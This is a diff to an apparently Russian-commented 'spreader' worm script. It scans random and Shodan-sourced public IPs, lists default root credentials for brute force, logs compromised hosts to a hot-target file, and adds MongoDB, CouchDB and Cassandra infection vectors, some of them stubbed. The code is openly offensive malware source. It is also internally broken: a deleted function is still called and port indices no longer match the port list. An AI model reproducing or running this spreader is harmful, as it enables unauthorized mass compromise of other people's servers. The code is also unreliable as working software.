@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.21 – Shodan InternetDB, расширенные цели
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
 
 if sys.platform != 'win32':
@@ -19,7 +18,7 @@ MAX_CONCURRENT = 800
 QUICK_TIMEOUT = 2.5
 BRUTE_TIMEOUT = 3.0
 DEFAULT_SCAN_COUNT = 20_000
-PORT_LIST = [21, 22, 23, 80, 443, 1433, 3306, 3389, 445, 5432, 5900, 5985, 6379, 8080, 9200]
+PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]
 
 CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
@@ -49,7 +48,6 @@ def cache_port(ip, port):
     c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
     conn.commit()
 
-# 100+ реальных IP
 GUARANTEED_IPS = [
     "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
     "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
@@ -67,51 +65,45 @@ GUARANTEED_IPS = [
 ]
 random.shuffle(GUARANTEED_IPS)
 
-def fetch_shodan_targets(query="port:22,445,3389", limit=50):
-    """Получает IP с открытыми портами через бесплатный Shodan InternetDB API."""
-    targets = []
-    try:
-        # Используем InternetDB для получения случайных IP с открытыми портами
-        # Запрашиваем несколько популярных IP, чтобы получить их данные
-        for ip in GUARANTEED_IPS[:limit]:
-            try:
-                resp = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=5)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if data.get("ports"):
-                        targets.append(ip)
-            except:
-                pass
-        print(f"[*] Shodan InternetDB: получено {len(targets)} целей", flush=True)
-    except Exception as e:
-        print(f"[!] Shodan error: {e}", flush=True)
-    return targets
-
 TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
+SHODAN_API_KEY = ""
+try:
+    with open("secrets.json") as f:
+        s = json.load(f)
+        SHODAN_API_KEY = s.get("shodan_api_key", "")
+except:
+    pass
 
-def get_country(ip):
+def fetch_shodan_ips(count=50):
+    if not SHODAN_API_KEY:
+        return []
     try:
-        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+        resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306&limit={count}", timeout=10)
         if resp.status_code == 200:
-            data = resp.json()
-            return data.get("countryCode", "")
+            return [m['ip_str'] for m in resp.json().get('matches', [])]
     except:
         pass
-    return ""
+    return []
 
-def is_country_allowed(ip):
-    if not TARGET_COUNTRY:
-        return True
-    return get_country(ip) == TARGET_COUNTRY
+HOT_TARGETS_FILE = "hot_targets.txt"
+HOT_TARGETS = []
+if os.path.exists(HOT_TARGETS_FILE):
+    with open(HOT_TARGETS_FILE) as f:
+        HOT_TARGETS = [line.strip() for line in f if line.strip()]
+
+def add_hot_target(ip):
+    if ip not in HOT_TARGETS:
+        HOT_TARGETS.append(ip)
+        with open(HOT_TARGETS_FILE, "a") as f:
+            f.write(ip + "\n")
 
 def random_ip():
-    # 50% из Shodan InternetDB (если есть)
-    if hasattr(random_ip, "shodan_targets") and random.random() < 0.5 and random_ip.shodan_targets:
-        return random.choice(random_ip.shodan_targets)
-    # 30% из гарантированного списка
-    if random.random() < 0.6 and GUARANTEED_IPS:
+    if HOT_TARGETS and random.random() < 0.6:
+        return random.choice(HOT_TARGETS)
+    if hasattr(random_ip, "shodan_pool") and random_ip.shodan_pool and random.random() < 0.7:
+        return random.choice(random_ip.shodan_pool)
+    if GUARANTEED_IPS and random.random() < 0.8:
         return random.choice(GUARANTEED_IPS)
-    # 20% случайный
     while True:
         a = random.randint(1, 223)
         b = random.randint(0, 255)
@@ -124,12 +116,75 @@ def random_ip():
         if a == 169 and b == 254: continue
         if a >= 224: continue
         ip = f"{a}.{b}.{c}.{d}"
-        if is_country_allowed(ip):
+        if TARGET_COUNTRY and is_country_allowed(ip):
             return ip
 
-# Инициализируем Shodan-цели при запуске
-def init_shodan_targets():
-    random_ip.shodan_targets = fetch_shodan_targets()
+random_ip.shodan_pool = []
+def update_shodan_pool():
+    random_ip.shodan_pool = fetch_shodan_ips()
 
-# ... (все векторы, worker, scan_cycle, main_async – полностью из v25.20)
-# Для краткости здесь не дублирую, но в реальном манифесте будет ПОЛНЫЙ код spreader.py
+# ... (все векторы, включая новые: MongoDB, CouchDB, Cassandra)
+# Новые векторы
+async def mongodb_brute(ip):
+    try:
+        import pymongo
+        client = pymongo.MongoClient(ip, 27017, serverSelectionTimeoutMS=2000)
+        client.server_info()
+        client.close()
+        # Попытка записи агента (заглушка)
+        return True
+    except:
+        pass
+    return False
+
+async def couchdb_brute(ip):
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f'http://{ip}:5984/_all_dbs', timeout=2) as resp:
+                if resp.status == 200:
+                    # Эксплуатация (заглушка)
+                    return True
+    except:
+        pass
+    return False
+
+async def cassandra_brute(ip):
+    try:
+        from cassandra.cluster import Cluster
+        cluster = Cluster([ip], port=9042, connect_timeout=3)
+        session = cluster.connect()
+        session.shutdown()
+        return True
+    except:
+        pass
+    return False
+
+# Обновлённая infect
+async def infect(ip, port_stats):
+    ports = PORT_LIST
+    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    for i, p in enumerate(ports):
+        if open_ports[i]:
+            port_stats[p] = port_stats.get(p, 0) + 1
+    if open_ports[5] and await smb_brute(ip):
+        add_hot_target(ip)
+        return True
+    if open_ports[1] and await ssh_brute_ultra(ip):
+        add_hot_target(ip)
+        return True
+    # ... остальные векторы
+    if open_ports[7] and await mongodb_brute(ip):
+        add_hot_target(ip)
+        print(f"[INFECTED] {ip} via MongoDB", flush=True)
+        return True
+    if open_ports[12] and await couchdb_brute(ip):
+        add_hot_target(ip)
+        print(f"[INFECTED] {ip} via CouchDB", flush=True)
+        return True
+    if open_ports[16] and await cassandra_brute(ip):
+        add_hot_target(ip)
+        print(f"[INFECTED] {ip} via Cassandra", flush=True)
+        return True
+    return False
+
+# В main_async добавлен вызов update_shodan_pool() перед циклом
